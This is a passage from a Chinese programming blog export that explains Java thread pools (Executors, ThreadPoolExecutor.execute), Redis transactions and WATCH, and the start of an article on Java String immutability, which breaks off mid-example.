AbortPolicy：丢弃任务并抛出RejectedExecutionException异常 CallerRunsPolicy：只用调用所在的线程运行任务 DiscardOldestPolicy：丢弃队列最前面的任务，然后重新尝试执行任务（重复此过程） DiscardPolicy：不处理，丢弃掉,不抛出异常。 2. 线程池的源码解读程序中要声明线程池，是这样写的： 12ExecutorService exec = Executors.newCachedThreadPool();exec.excute(Runnable command); 先来看看ExecutorService其中的奥秘。 2.1 ExecutorService和Executor的关系Executor是一个顶层接口，在它里面只声明了一个方法execute(Runnable)，返回值为void，参数为Runnable类型，从字面意思可以理解，就是用来执行传进去的任务的；123public interface Executor &#123; void execute(Runnable command);&#125; ExecutorService接口继承了Executor接口，并声明了一些方法：submit、invokeAll、invokeAny以及shutDown等；12345678910111213141516171819202122public interface ExecutorService extends Executor &#123; void shutdown(); boolean isShutdown(); boolean isTerminated(); boolean awaitTermination(long timeout, TimeUnit unit) throws InterruptedException; &lt;T&gt; Future&lt;T&gt; submit(Callable&lt;T&gt; task); &lt;T&gt; Future&lt;T&gt; submit(Runnable task, T result); Future&lt;?&gt; submit(Runnable task); &lt;T&gt; List&lt;Future&lt;T&gt;&gt; invokeAll(Collection&lt;? extends Callable&lt;T&gt;&gt; tasks) throws InterruptedException; &lt;T&gt; List&lt;Future&lt;T&gt;&gt; invokeAll(Collection&lt;? extends Callable&lt;T&gt;&gt; tasks, long timeout, TimeUnit unit) throws InterruptedException; &lt;T&gt; T invokeAny(Collection&lt;? extends Callable&lt;T&gt;&gt; tasks) throws InterruptedException, ExecutionException; &lt;T&gt; T invokeAny(Collection&lt;? extends Callable&lt;T&gt;&gt; tasks, long timeout, TimeUnit unit) throws InterruptedException, ExecutionException, TimeoutException;&#125; 在ThreadPoolExecutor类中有几个非常重要的方法： execute()execute()方法实际上是Executor中声明的方法，在ThreadPoolExecutor进行了具体的实现，这个方法是ThreadPoolExecutor的核心方法，通过这个方法可以向线程池提交一个任务，交由线程池去执行。 submit()submit()方法是在ExecutorService中声明的方法,这个方法也是用来向线程池提交任务的，但是它和execute()方法不同，它能够返回任务执行的结果，去看submit()方法的实现，会发现它实际上还是调用的execute()方法，只不过它利用了Future来获取任务执行结果。 shutdown()将线程池状态置为SHUTDOWN,并不会立即停止： 停止接收外部submit的任务 内部正在跑的任务和队列里等待的任务，会执行完 等到第二步完成后，才真正停止 shutdownNow()将线程池状态置为STOP。企图立即停止，事实上不一定： 跟shutdown()一样，先停止接收外部提交的任务 忽略队列里等待的任务 尝试将正在跑的任务interrupt中断 返回未执行的任务列表 它试图终止线程的方法是通过调用Thread.interrupt()方法来实现的，但是大家知道，这种方法的作用有限，如果线程中没有sleep 、wait、Condition、定时锁等应用, interrupt()方法是无法中断当前的线程的。所以，ShutdownNow()并不代表线程池就一定立即就能退出，它也可能必须要等待所有正在执行的任务都执行完成了才能退出。 但是大多数时候是能立即退出的 awaitTermination(long timeOut, TimeUnit unit) 当前线程阻塞，直到 等所有已提交的任务（包括正在跑的和队列中等待的）执行完 或者等超时时间到 或者线程被中断，抛出InterruptedException 然后返回true（shutdown请求后所有任务执行完毕）或false（已超时） shuntdown()和awaitTermination()效果差不多，方法执行之后，都要等到提交的任务全部执行完才停。 shutdown()后，不能再提交新的任务进去；但是awaitTermination()后，可以继续提交。 awaitTermination()是阻塞的，返回结果是线程池是否已停止（true/false）；shutdown()不阻塞。 2.2 Executors生成线程池要配置一个线程池是比较复杂的，尤其是对于线程池的原理不是很清楚的情况下，很有可能配置的线程池不是较优的，因此在Executors类里面提供了一些静态工厂，生成一些常用的线程池。 其实都是通过调用ThreadPoolExecutor来完成的，最后返回ExecutorService。 newSingleThreadExecutor 创建一个单线程的线程池。这个线程池只有一个线程在工作，也就是相当于单线程串行执行所有任务。如果这个唯一的线程因为异常结束，那么会有一个新的线程来替代它。此线程池保证所有任务的执行顺序按照任务的提交顺序执行。 123456789101112131415161718//创建一个核心线程个数和最大线程个数都为1的线程池//阻塞队列长度为Integer.MAX_VALUE//keeyAliveTime=0说明只要线程个数比核心线程个数多并且当前空闲则回收public static ExecutorService newSingleThreadExecutor() &#123; return new FinalizableDelegatedExecutorService (new ThreadPoolExecutor(1, 1, 0L, TimeUnit.MILLISECONDS, new LinkedBlockingQueue&lt;Runnable&gt;()));&#125;//使用自己的线程工厂public static ExecutorService newSingleThreadExecutor(ThreadFactory threadFactory) &#123; return new FinalizableDelegatedExecutorService (new ThreadPoolExecutor(1, 1, 0L, TimeUnit.MILLISECONDS, new LinkedBlockingQueue&lt;Runnable&gt;(), threadFactory));&#125; demo： 12345678910111213141516@Slf4jpublic class ThreadPoolTest3 &#123; public static void main(String[] args) &#123; ExecutorService exec = Executors.newSingleThreadExecutor(); for(int i=0;i&lt;10;i++)&#123; final int index = i; exec.execute(() -&gt; &#123; log.info("task:&#123;&#125;,index:&#123;&#125;",Thread.currentThread().getId(),index); &#125;); &#125; exec.shutdown(); &#125;&#125; 运行结果： 12345678910task:10,index:0task:10,index:1task:10,index:2task:10,index:3task:10,index:4task:10,index:5task:10,index:6task:10,index:7task:10,index:8task:10,index:9 运行结果分析：单线程+有序。 newFixedThreadPool 创建固定大小的线程池。每次提交一个任务就创建一个线程，直到线程达到线程池的最大大小。线程池的大小一旦达到最大值就会保持不变，如果某个线程因为执行异常而结束，那么线程池会补充一个新线程。 123456789101112131415//创建一个核心线程个数和最大线程个数都为nThreads的线程池//阻塞队列长度为Integer.MAX_VALUE//keeyAliveTime=0说明只要线程个数比核心线程个数多并且当前空闲则回收public static ExecutorService newFixedThreadPool(int nThreads) &#123; return new ThreadPoolExecutor(nThreads, nThreads, 0L, TimeUnit.MILLISECONDS, new LinkedBlockingQueue&lt;Runnable&gt;());&#125;//使用自定义线程创建工厂public static ExecutorService newFixedThreadPool(int nThreads, ThreadFactory threadFactory) &#123; return new ThreadPoolExecutor(nThreads, nThreads, 0L, TimeUnit.MILLISECONDS, new LinkedBlockingQueue&lt;Runnable&gt;(), threadFactory);&#125; demo： 12345678910111213141516@Slf4jpublic class ThreadPoolTest2 &#123; public static void main(String[] args) &#123; ExecutorService exec = Executors.newFixedThreadPool(3); for(int i=0;i&lt;10;i++)&#123; final int index = i; exec.execute(() -&gt; &#123; log.info("task:&#123;&#125;,index:&#123;&#125;",Thread.currentThread().getId(),index); &#125;); &#125; exec.shutdown(); &#125;&#125; 运行结果： 12345678910task:11,index:1task:11,index:3task:11,index:4task:11,index:5task:11,index:6task:11,index:7task:11,index:8task:11,index:9task:10,index:0task:12,index:2 结果分析：只创建了三个线程来执行。 newCachedThreadPool 创建一个可缓存的线程池。如果线程池的大小超过了处理任务所需要的线程，那么就会回收部分空闲（60秒不执行任务）的线程，当任务数增加时，此线程池又可以智能的添加新线程来处理任务。此线程池不会对线程池大小做限制，线程池大小完全依赖于操作系统（或者说JVM）能够创建的最大线程大小。 1234567891011121314151617//创建一个按需创建线程的线程池，初始线程个数为0，最多线程个数为Integer.MAX_VALUE//阻塞队列为同步队列//keeyAliveTime=60说明只要当前线程60s内空闲则回收//特殊在于加入到同步队列的任务会被马上被执行，同步队列里面最多只有一个任务，并且存在后马上会拿出执行public static ExecutorService newCachedThreadPool() &#123; return new ThreadPoolExecutor(0, Integer.MAX_VALUE, 60L, TimeUnit.SECONDS, new SynchronousQueue&lt;Runnable&gt;());&#125;//使用自定义的线程工厂public static ExecutorService newCachedThreadPool(ThreadFactory threadFactory) &#123; return new ThreadPoolExecutor(0, Integer.MAX_VALUE, 60L, TimeUnit.SECONDS, new SynchronousQueue&lt;Runnable&gt;(), threadFactory);&#125; demo： 12345678910111213141516@Slf4jpublic class ThreadPoolTest1 &#123; public static void main(String[] args) &#123; ExecutorService exec = Executors.newCachedThreadPool(); for(int i=0;i&lt;10;i++)&#123; final int index = i; exec.execute(() -&gt; &#123; log.info("task:&#123;&#125;,index:&#123;&#125;",Thread.currentThread().getId(),index); &#125;); &#125; exec.shutdown(); &#125;&#125; 运行结果： 12345678910task:10,index:0task:12,index:2task:14,index:4task:16,index:6task:18,index:8task:11,index:1task:13,index:3task:15,index:5task:17,index:7task:19,index:9 结果分析：按需创建线程，几乎一次循环就创建了一个新的线程来执行。 newScheduledThreadPool 创建一个大小无限的线程池。此线程池支持定时以及周期性执行任务的需求。 12345//创建一个最小线程个数corePoolSize，最大为Integer.MAX_VALUE//阻塞队列为DelayedWorkQueue的线程池public static ScheduledExecutorService newScheduledThreadPool(int corePoolSize) &#123; return new ScheduledThreadPoolExecutor(corePoolSize);&#125; demo： 1234567891011121314151617181920212223242526272829303132//多长时间之后执行一次@Slf4jpublic class ThreadPoolTest4 &#123; public static void main(String[] args) &#123; ScheduledExecutorService exec = Executors.newScheduledThreadPool(3); exec.schedule(new Runnable() &#123; @Override public void run() &#123; log.info("schedule run"); &#125; &#125;,3, TimeUnit.SECONDS); exec.shutdown(); &#125;&#125;//定时执行，这里是每隔3秒执行一次@Slf4jpublic class ThreadPoolTest4 &#123; public static void main(String[] args) &#123; ScheduledExecutorService exec = Executors.newScheduledThreadPool(3); exec.scheduleAtFixedRate(new Runnable() &#123; @Override public void run() &#123; log.info("schedule run"); &#125; &#125;,1,3,TimeUnit.SECONDS);//一开始延迟1秒执行任务，之后每隔3秒执行一次任务，不适合调用exec.shutdown();，因为会被关闭 &#125;&#125; newSingleThreadScheduledExecutor 创建一个单线程的线程池。此线程池支持定时以及周期性执行任务的需求。 123456//创建一个最小线程个数corePoolSize为1，最大为Integer.MAX_VALUE//阻塞队列为DelayedWorkQueue的线程池。public static ScheduledExecutorService newSingleThreadScheduledExecutor() &#123; return new DelegatedScheduledExecutorService (new ScheduledThreadPoolExecutor(1));&#125; 同上。demo不再赘述。 2.3 线程池实现原理–线程池状态 static final int RUNNING = 0; 当创建线程池后，初始时，线程池处于RUNNING状态； static final int SHUTDOWN = 1; 如果调用了shutdown()方法，则线程池处于SHUTDOWN状态，此时线程池不能够接受新的任务，它会等待所有任务执行完毕； static final int STOP = 2; 如果调用了shutdownNow()方法，则线程池处于STOP状态，此时线程池不能接受新的任务，并且会去尝试终止正在执行的任务； static final int TERMINATED = 3; 当线程池处于SHUTDOWN或STOP状态，并且所有工作线程已经销毁，任务缓存队列已经清空或执行结束后，线程池被设置为TERMINATED状态。 2.4 线程池实现原理–任务的执行corePoolSize在很多地方被翻译成核心池大小，其实我的理解这个就是线程池的大小。举个简单的例子： 假如有一个工厂，工厂里面有10个工人，每个工人同时只能做一件任务。 因此只要当10个工人中有工人是空闲的，来了任务就分配给空闲的工人做； 当10个工人都有任务在做时，如果还来了任务，就把任务进行排队等待； 如果说新任务数目增长的速度远远大于工人做任务的速度，那么此时工厂主管可能会想补救措施，比如重新招4个临时工人进来； 然后就将任务也分配给这4个临时工人做； 如果说着14个工人做任务的速度还是不够，此时工厂主管可能就要考虑不再接收新的任务或者抛弃前面的一些任务了。 当这14个工人当中有人空闲时，而新任务增长的速度又比较缓慢，工厂主管可能就考虑辞掉4个临时工了，只保持原来的10个工人，毕竟请额外的工人是要花钱的。 这个例子中的corePoolSize就是10，而maximumPoolSize就是14（10+4）。 也就是说corePoolSize就是线程池大小，maximumPoolSize在我看来是线程池的一种补救措施，即任务量突然过大时的一种补救措施。 不过为了方便理解，在本文后面还是将corePoolSize翻译成核心池大小。 在ThreadPoolExecutor类中，最核心的任务提交方法是execute()方法，虽然通过submit也可以提交任务，但是实际上submit方法里面最终调用的还是execute()方法，所以我们只需要研究execute()方法的实现原理即可： 注：execute()方法和submit()方法已经在前面讲过区别了。 123456789101112131415161718192021222324252627282930313233343536373839404142public void execute(Runnable command) &#123; if (command == null) throw new NullPointerException(); // // Proceed in 3 steps: // // 1. // 判断当前的线程数是否小于corePoolSize,如果是，使用入参任务通过addWord方法创建一个新的线程， // 如果能完成新线程创建exexute方法结束，成功提交任务 // 2. // 在第一步没有完成任务提交；状态为运行并且能够成功加入任务到工作队列后，再进行一次check，如果状态 // 在任务加入队列后变为了非运行（有可能是在执行到这里线程池shutdown了），非运行状态下当然是需要 // reject；然后再判断当前线程数是否为0（有可能这个时候线程数变为了0），如是，新增一个线程； // 3. // 如果不能加入任务到工作队列，将尝试使用任务新增一个线程，如果失败，则是线程池已经shutdown或者线程池 // 已经达到饱和状态，所以reject这个任务 // int c = ctl.get(); // 工作线程数小于核心线程数 if (workerCountOf(c) &lt; corePoolSize) &#123; // 直接启动新线程，true表示会再次检查workerCount是否小于corePoolSize if (addWorker(command, true)) return; c = ctl.get(); &#125; // 如果工作线程数大于等于核心线程数 // 线程的的状态为RUNNING并且队列notfull if (isRunning(c) &amp;&amp; workQueue.offer(command)) &#123; // 再次检查线程的运行状态，如果不是RUNNING直接从队列中移除 int recheck = ctl.get(); if (! isRunning(recheck) &amp;&amp; remove(command)) // 移除成功，拒绝该非运行的任务 reject(command); else if (workerCountOf(recheck) == 0) // 防止了SHUTDOWN状态下没有活动线程了，但是队列里还有任务没执行这种特殊情况。 // 添加一个null任务是因为SHUTDOWN状态下，线程池不再接受新任务 addWorker(null, false); &#125; // 如果队列满了或者是非运行的任务都拒绝执行 else if (!addWorker(command, false)) reject(command);&#125; 代码体现了上面提到的线程池工作原理，这里再强调一下过程： 1.如果当前运行的线程少于corePoolSize，则创建新线程来执行任务（注意，执行这一步骤需要获取全局锁）。 2.如果运行的线程等于或多于corePoolSize，则将任务加入BlockingQueue。 3.如果无法将任务加入BlockingQueue（队列已满），则在非corePool中创建新的线程来处理任务（注意，执行这一步骤需要获取全局锁）。 4.如果创建新线程将使当前运行的线程超出maximumPoolSize，任务将被拒绝，并调用RejectedExecutionHandler.rejectedExecution()方法。 ThreadPoolExecutor采取上述步骤的总体设计思路，是为了在执行execute()方法时，尽可能地避免获取全局锁（那将会是一个严重的可伸缩瓶颈）。在ThreadPoolExecutor完成预热之后（当前运行的线程数大于等于corePoolSize），几乎所有的execute()方法调用都是执行步骤2，而步骤2不需要获取全局锁。 3. 线程池合理配置 任务性质：CPU密集型，IO密集型，混合型。 CPU密集型应配置尽可能小的线程，如N(CPU) + 1；IO密集型任务应配置尽可能多的线程，如2 * N(CPU)； 任务优先级：高，中，低。 可使用优先级队列。 任务执行时间：长，中，短。 可用不同规模的线程池处理。 任务的依赖性：是否依赖其他系统资源，如数据库连接。 依赖数据库连接池的任务，因为线程提交SQL后需要等待数据库返回结果，CPU空闲较多，线程数应设置大些。 建议使用有界队列,增加系统稳定性和预警能力。 线程池的监控 taskCount 返回过去任务的大概总数(包含queue size)。 completedTaskCount 已完成任务数量，&lt;= taskCount largestPoolSize 曾创建过的最大线程数 getPoolSize 线程池的线程数量 getActiveCount 活动线程数]]></content>
      <tags>
        <tag>java并发进阶</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[10.redis事务]]></title>
    <url>%2F2018%2F07%2F21%2F10.redis%E4%BA%8B%E5%8A%A1%2F</url>
    <content type="text"><![CDATA[详细探讨redis事务的用法和原理。 redis 事务是一组命令的集合，至少是两个或两个以上的命令，redis 事务保证这些命令被执行时中间不会被任何其他操作打断。 事务基本认识当客户端处于非事务状态下时， 所有发送给服务器端的命令都会立即被服务器执行。 但是， 当客户端进入事务状态之后， 服务器在收到来自客户端的命令时， 不会立即执行命令， 而是将这些命令全部放进一个事务队列里， 然后返回 QUEUED ， 表示命令已入队。 事务执行前面说到， 当客户端进入事务状态之后， 客户端发送的命令就会被放进事务队列里。 但其实并不是所有的命令都会被放进事务队列， 其中的例外就是 EXEC 、 DISCARD 、 MULTI 和 WATCH 这四个命令 —— 当这四个命令从客户端发送到服务器时， 它们会像客户端处于非事务状态一样， 直接被服务器执行： 如果客户端正处于事务状态， 那么当 EXEC 命令执行时， 服务器根据客户端所保存的事务队列， 以先进先出（FIFO）的方式执行事务队列中的命令： 最先入队的命令最先执行， 而最后入队的命令最后执行。 事务基本命令介绍除了 EXEC 之外， 服务器在客户端处于事务状态时， 不加入到事务队列而直接执行的另外三个命令是 DISCARD 、 MULTI 和 WATCH 。 DISCARD 命令用于取消一个事务， 它清空客户端的整个事务队列， 然后将客户端从事务状态调整回非事务状态， 最后返回字符串 OK 给客户端， 说明事务已被取消。 Redis 的事务是不可嵌套的， 当客户端已经处于事务状态， 而客户端又再向服务器发送 MULTI 时， 服务器只是简单地向客户端发送一个错误， 然后继续等待其他命令的入队。 MULTI 命令的发送不会造成整个事务失败， 也不会修改事务队列中已有的数据。 WATCH 只能在客户端进入事务状态之前执行， 在事务状态下发送 WATCH 命令会引发一个错误， 但它不会造成整个事务失败， 也不会修改事务队列中已有的数据（和前面处理 MULTI 的情况一样）。 正常情况123multi//开启事务，下面的命令先不执行，先暂时保存起来set key val//命令入队exec//提交事务（执行命令） 异常情况1234multi//开启事务，下面的命令先不执行，先暂时保存起来set key val//正常命令入队set key//错误命令，直接报错exec//事务被丢弃，提交失败 例外情况1234multi//开启事务，下面的命令先不执行，先暂时保存起来set key val//正常命令入队incr key//虽然字符串不能增一，但是不报错，入队exec//自增会失败，但是key被设置成功了，整个事务没有回滚 放弃事务123multi//开启事务，下面的命令先不执行，先暂时保存起来set key val//正常命令入队discard 乐观锁乐观锁：每次拿数据的时候都认为别人不会修改该数据，所以不会上锁，但是在更新的时候会判断一下在此期间别人有没有去更新这条数据，一般使用版本号进行判断，乐观锁使用于读多写少的应用类型，这样可以提高吞吐量。 乐观锁大多情况是根据数据版本号(version)的机制实现的，何为数据版本？即为数据增加一个版本标识，在基于数据库表的版本解决方案中，一般是通过为数据库添加一个version字段来实现读取出数据时，将此版本号一起读出，之后更新时，对此版本号加1，此时将提交数据的版本号与数据库表对应记录的当前版本号进行比对，如果提交的数据版本号大于数据库表的当前版本，则予以更新，否则认为是过期数据，不予更新。 A B 读出版本号为1，操作 A操作时，读出版本号也为1，进行某个操作(修改) 执行修改，version+1=2，因为2&gt;1，所以更新 … … 执行修改，version+1=2，发现数据库记录的版本也为2，2=2,更新失败 watch机制WATCH 命令用于在事务开始之前监视任意数量的键： 当调用 EXEC 命令执行事务时， 如果任意一个被监视的键已经被其他客户端修改了， 那么整个事务不再执行， 直接返回失败。 123456set k1 1 //设置k1值为1watch k1 //监视k1(其他客户端不能修改k1值)set k1 2 //设置k1值为2multi //开始事务set k1 3 //修改k1值为3exex //提交事务，k1值仍为2，因为事务开始之前k1值被修改了 watch机制举例大家可能知道redis提供了基于incr命令来操作一个整数型数值的原子递增，那么我们假设如果redis没有这个incr命令，我们该怎么实现这个incr的操作呢？ 正常情况下我们想要对一个整形数值做修改是这么做的(伪代码实现)： 123val = GET mykeyval = val + 1SET mykey $val 但是上述的代码会出现一个问题,因为上面吧正常的一个incr(原子递增操作)分为了两部分,那么在多线程(分布式)环境中，这个操作就有可能不再具有原子性了。 研究过java的juc包的人应该都知道cas，那么redis也提供了这样的一个机制，就是利用watch命令来实现的。 具体做法如下: 123456WATCH mykeyval = GET mykeyval = val + 1MULTISET mykey $valEXEC 和此前代码不同的是，新代码在获取mykey的值之前先通过WATCH命令监控了该键，此后又将set命令包围在事务中，这样就可以有效的保证每个连接在执行EXEC之前，如果当前连接获取的mykey的值被其它连接的客户端修改，那么当前连接的EXEC命令将执行失败。这样调用者在判断返回值后就可以获悉val是否被重新设置成功。 由于WATCH命令的作用只是当被监控的键值被修改后阻止之后一个事务的执行，而不能保证其他客户端不修改这一键值，所以在一般的情况下我们需要在EXEC执行失败后重新执行整个函数。 执行EXEC命令后会取消对所有键的监控，如果不想执行事务中的命令也可以使用UNWATCH命令来取消监控。 watch机制原理WATCH 命令的实现在每个代表数据库的 redis.h/redisDb 结构类型中， 都保存了一个 watched_keys 字典， 字典的键是这个数据库被监视的键， 而字典的值则是一个链表， 链表中保存了所有监视这个键的客户端。 比如说，以下字典就展示了一个 watched_keys 字典的例子： 其中， 键 key1 正在被 client2 、 client5 和 client1 三个客户端监视， 其他一些键也分别被其他别的客户端监视着。 WATCH 命令的作用， 就是将当前客户端和要监视的键在 watched_keys 中进行关联。 举个例子， 如果当前客户端为 client10086 ， 那么当客户端执行 WATCH key1 key2 时， 前面展示的 watched_keys 将被修改成这个样子： 通过 watched_keys 字典， 如果程序想检查某个键是否被监视， 那么它只要检查字典中是否存在这个键即可； 如果程序要获取监视某个键的所有客户端， 那么只要取出键的值（一个链表）， 然后对链表进行遍历即可。 WATCH 的触发在任何对数据库键空间（key space）进行修改的命令成功执行之后 （比如 FLUSHDB 、 SET 、 DEL 、 LPUSH 、 SADD 、 ZREM ，诸如此类）， multi.c/touchWatchedKey 函数都会被调用 —— 它检查数据库的 watched_keys 字典， 看是否有客户端在监视已经被命令修改的键， 如果有的话， 程序将所有监视这个/这些被修改键的客户端的 REDIS_DIRTY_CAS 选项打开： 当客户端发送 EXEC 命令、触发事务执行时， 服务器会对客户端的状态进行检查： 如果客户端的 REDIS_DIRTY_CAS 选项已经被打开，那么说明被客户端监视的键至少有一个已经被修改了，事务的安全性已经被破坏。服务器会放弃执行这个事务，直接向客户端返回空回复，表示事务执行失败。 如果 REDIS_DIRTY_CAS 选项没有被打开，那么说明所有监视键都安全，服务器正式执行事务。 举个例子，假设数据库的 watched_keys 字典如下图所示： 如果某个客户端对 key1 进行了修改（比如执行 DEL key1 ）， 那么所有监视 key1 的客户端， 包括 client2 、 client5 和 client1 的 REDIS_DIRTY_CAS 选项都会被打开， 当客户端 client2 、 client5 和 client1 执行 EXEC 的时候， 它们的事务都会以失败告终。 最后，当一个客户端结束它的事务时，无论事务是成功执行，还是失败， watched_keys 字典中和这个客户端相关的资料都会被清除。 事务的 ACID 性质Redis 事务保证了其中的一致性和隔离性，但并不保证原子性和持久性。 原子性（Atomicity）单个 Redis 命令的执行是原子性的，但 Redis 没有在事务上增加任何维持原子性的机制，所以 Redis 事务的执行并不是原子性的。 如果一个事务队列中的所有命令都被成功地执行，那么称这个事务执行成功。 另一方面，如果 Redis 服务器进程在执行事务的过程中被停止 —— 比如接到 KILL 信号、宿主机器停机，等等，那么事务执行失败。 当事务失败时，Redis 也不会进行任何的重试或者回滚动作。 一致性（Consistency）Redis 的一致性问题可以分为三部分来讨论：入队错误、执行错误、Redis 进程被终结。 前面两者上面已经讨论过了，这里再重复一下. 入队错误 入队错误一般是错误的命令(不考虑能不能执行，命令本身就是错误的)，带有不正确入队命令的事务不会被执行，也不会影响数据库的一致性； 执行错误 如果命令在事务执行的过程中发生错误，比如说，对一个不同类型的 key 执行了错误的操作， 那么 Redis 只会将错误包含在事务的结果中， 这不会引起事务中断或整个失败，不会影响已执行事务命令的结果，也不会影响后面要执行的事务命令， 所以它对事务的一致性也没有影响。 Redis 进程被终结 如果 Redis 服务器进程在执行事务的过程中被其他进程终结，或者被管理员强制杀死，那么根据 Redis 所使用的持久化模式，可能有以下情况出现： 内存模式：如果 Redis 没有采取任何持久化机制，那么重启之后的数据库总是空白的，所以数据总是一致的。 RDB 模式：在执行事务时，Redis 不会中断事务去执行保存 RDB 的工作，只有在事务执行之后，保存 RDB 的工作才有可能开始。所以当 RDB 模式下的 Redis 服务器进程在事务中途被杀死时，事务内执行的命令，不管成功了多少，都不会被保存到 RDB 文件里。所以显然会造成不一致 AOF 模式：因为保存 AOF 文件的工作在后台线程进行，所以即使是在事务执行的中途，保存 AOF 文件的工作也可以继续进行,如果事务语句未写入到 AOF 文件，那么显然是一致的，因为事务里的操作全部失败；如果事务的部分语句被写入到 AOF 文件，并且 AOF 文件被成功保存，那么不完整的事务执行信息就会遗留在 AOF 文件里，当重启 Redis 时，程序会检测到 AOF 文件并不完整，Redis 会退出，并报告错误。需要使用 redis-check-aof 工具将部分成功的事务命令移除之后，才能再次启动服务器。还原之后的数据总是一致的，而且数据也是最新的（直到事务执行之前为止）。 隔离性（Isolation）Redis 是单进程程序，并且它保证在执行事务时，不会对事务进行中断，事务可以运行直到执行完所有事务队列中的命令为止。因此，Redis 的事务是总是带有隔离性的。 持久性（Durability） 在单纯的内存模式下，事务肯定是不持久的。 在 RDB 模式下，服务器可能在事务执行之后、RDB 文件更新之前的这段时间宕机，所以 RDB 模式下的 Redis 事务也是不持久的。 在 AOF 的“总是 SYNC ”模式下，事务的每条命令在执行成功之后，都会立即调用 fsync 或 fdatasync 将事务数据写入到 AOF 文件。但是，这种保存是由后台线程进行的，主线程不会阻塞直到保存成功，所以从命令执行成功到数据保存到硬盘之间，还是有一段非常小的间隔，服务器也有可能出现问题，所以这种模式下的事务也是不持久的。 都是不持久的。 总结 MULTI 命令的执行标记着事务的开始 当客户端进入事务状态之后， 服务器在收到来自客户端的命令时， 不会立即执行命令， 而是将这些命令全部放进一个事务队列里， 然后返回 QUEUED ， 表示命令已入队 Redis 的事务保证了 ACID 中的一致性（C）和隔离性（I），但并不保证原子性（A）和持久性（D）。 不加入到事务队列而直接执行的四个命令为：EXEC 、 DISCARD 、 MULTI 和 WATCH DISCARD 命令用于取消一个事务 Redis 的事务是不可嵌套的 WATCH 只能在客户端进入事务状态之前执行 WATCH机制的引用于原理 参考： http://redisbook.readthedocs.io/en/latest/feature/transaction.html https://www.jianshu.com/p/361cb9cd13d5]]></content>
      <categories>
        <category>redis</category>
      </categories>
      <tags>
        <tag>redis学习</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[10.java字符串]]></title>
    <url>%2F2018%2F07%2F21%2F10.java%E5%AD%97%E7%AC%A6%E4%B8%B2%2F</url>
    <content type="text"><![CDATA[字符串中的一些面试考点。 什么是不可变对象？众所周知， 在Java中， String类是不可变的。那么到底什么是不可变的对象呢？ 可以这样认为：如果一个对象，在它创建完成之后，不能再改变它的状态，那么这个对象就是不可变的。不能改变状态的意思是，不能改变对象内的成员变量，包括基本数据类型的值不能改变，引用类型的变量不能指向其他的对象，引用类型指向的对象的状态也不能改变。 区分对象和对象的引用对于Java初学者， 对于String是不可变对象总是存有疑惑。看下面代码： 12345String s = "ABCabc"; System.out.println("s = " + s); s = "123456"; System.out.println("s = " + s); 打印结果: 12s = ABCabcs = 123456 首先创建一个String对象s，然后让s的值为“ABCabc”， 然后又让s的值为“123456”。 从打印结果可以看出，s的值确实改变了。那么怎么还说String对象是不可变的呢？ 其实这里存在一个误区： s只是一个String对象的引用，并不是对象本身。对象在内存中是一块内存区，成员变量越多，这块内存区占的空间越大。引用只是一个4字节的数据，里面存放了它所指向的对象的地址，通过这个地址可以访问对象。也就是说，s只是一个引用，它指向了一个具体的对象，当s=“123456”; 这句代码执行过之后，又创建了一个新的对象“123456”， 而引用s重新指向了这个新的对象，原来的对象“ABCabc”还在内存中存在，并没有改变。内存结构如下图所示： 为什么String对象是不可变的？要理解String的不可变性，首先看一下String类中都有哪些成员变量。 在JDK1.6中，String的成员变量有以下几个： 1234567891011121314public final class String implements java.io.Serializable, Comparable&lt;String&gt;, CharSequence &#123; /** The value is used for character storage. */ private final char value[]; /** The offset is the first index of the storage that is used. */ private final int offset; /** The count is the number of characters in the String. */ private final int count; /** Cache the hash code for the string */ private int hash; // Default to 0 在JDK1.7和1.8中，String类做了一些改动，主要是改变了substring方法执行时的行为，这和本文的主题不相关。JDK1.7中String类的主要成员变量就剩下了两个： 1234567public final class String implements java.io.Serializable, Comparable&lt;String&gt;, CharSequence &#123; /** The value is used for character storage. */ private final char value[]; /** Cache the hash code for the string */ private int hash; // Default to 0 由以上的代码可以看出， 在Java中String类其实就是对字符数组的封装。JDK6中， value是String封装的数组，offset是String在这个value数组中的起始位置，count是String所占的字符的个数。在JDK7中，只有一个value变量，也就是value中的所有字符都是属于String这个对象的。这个改变不影响本文的讨论。 除此之外还有一个hash成员变量，是该String对象的哈希值的缓存，这个成员变量也和本文的讨论无关。在Java中，数组也是对象。 所以value也只是一个引用，它指向一个真正的数组对象。其实执行了String s = “ABCabc”; 这句代码之后，真正的内存布局应该是这样的： value，offset和count这三个变量都是private的，并且没有提供setValue， setOffset和setCount等公共方法来修改这些值，所以在String类的外部无法修改String。也就是说一旦初始化就不能修改， 并且在String类的外部不能访问这三个成员。此外，value，offset和count这三个变量都是final的， 也就是说在String类内部，一旦这三个值初始化了， 也不能被改变。所以可以认为String对象是不可变的了。 那么在String中，明明存在一些方法，调用他们可以得到改变后的值。这些方法包括substring， replace， replaceAll， toLowerCase等。例如如下代码： 1234String a = &quot;ABCabc&quot;; System.out.println(&quot;a = &quot; + a); //ABCabca = a.replace(&apos;A&apos;, &apos;a&apos;); System.out.println(&quot;a = &quot; + a); //aBCabc 那么a的值看似改变了，其实也是同样的误区。再次说明， a只是一个引用， 不是真正的字符串对象，在调用a.replace(‘A’, ‘a’)时， 方法内部创建了一个新的String对象，并把这个心的对象重新赋给了引用a。String中replace方法的源码可以说明问题： 1234567891011121314151617181920212223242526public String replace(char oldChar, char newChar) &#123; if (oldChar != newChar) &#123; int len = value.length; int i = -1; char[] val = value; /* avoid getfield opcode */ while (++i &lt; len) &#123; if (val[i] == oldChar) &#123; break; &#125; &#125; if (i &lt; len) &#123; char buf[] = new char[len]; for (int j = 0; j &lt; i; j++) &#123; buf[j] = val[j]; &#125; while (i &lt; len) &#123; char c = val[i]; buf[i] = (c == oldChar) ? newChar : c; i++; &#125; return new String(buf, true);//new出了新的String对象 &#125; &#125; return this;&#125; String对象真的不可变吗？从上文可知String的成员变量是private final 的，也就是初始化之后不可改变。那么在这几个成员中， value比较特殊，因为他是一个引用变量，而不是真正的对象。value是final修饰的，也就是说final不能再指向其他数组对象，那么我能改变value指向的数组吗？ 比如将数组中的某个位置上的字符变为下划线“_”。 至少在我们自己写的普通代码中不能够做到，因为我们根本不能够访问到这个value引用，更不能通过这个引用去修改数组。那么用什么方式可以访问私有成员呢？ 没错，用反射， 可以反射出String对象中的value属性， 进而改变通过获得的value引用改变数组的结构。下面是实例代码： 123456789101112131415161718192021public static void testReflection() throws Exception &#123; //创建字符串"Hello World"， 并赋给引用s String s = "Hello World"; System.out.println("s = " 